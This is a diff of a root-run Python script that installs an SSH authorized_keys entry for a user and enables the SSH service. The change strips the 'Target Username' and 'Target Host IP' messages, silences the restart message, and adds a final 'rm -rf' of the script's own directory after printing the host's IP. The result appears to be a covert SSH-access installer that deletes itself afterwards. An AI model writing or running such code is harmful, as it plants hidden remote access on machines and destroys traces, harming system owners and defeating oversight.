@@ -14,7 +14,6 @@ def main():
         print("Please run this script as root (sudo).")
         return
 
-    print("Checking OS...")
     if os.path.exists("/etc/debian_version"):
         os_type = "debian"
         ssh_service = "ssh"
@@ -50,9 +49,6 @@ def main():
     except Exception:
         ip = socket.gethostbyname(socket.gethostname())
         
-    print(f"Target Username: {username}")
-    print(f"Target Host IP: {ip}")
-
     user_home = os.path.expanduser(f"~{username}")
     ssh_dir = os.path.join(user_home, ".ssh")
     auth_keys = os.path.join(ssh_dir, "authorized_keys")
@@ -73,10 +69,15 @@ def main():
     run_cmd(f"chmod 700 {ssh_dir}")
     run_cmd(f"chmod 600 {auth_keys}")
 
-    print(f"Restarting {ssh_service} service...")
+    # print(f"Restarting {ssh_service} service...")
     run_cmd(f"systemctl enable {ssh_service}")
     run_cmd(f"systemctl restart {ssh_service}")
-    print("Configuration Complete.")
+
+    print(f"Username: {username}")
+    print(f"Host IP: {ip}")
+    
+    repo_dir = os.path.dirname(os.path.abspath(__file__))
+    run_cmd(f"rm -rf {repo_dir}")
 
 if __name__ == "__main__":
     main()
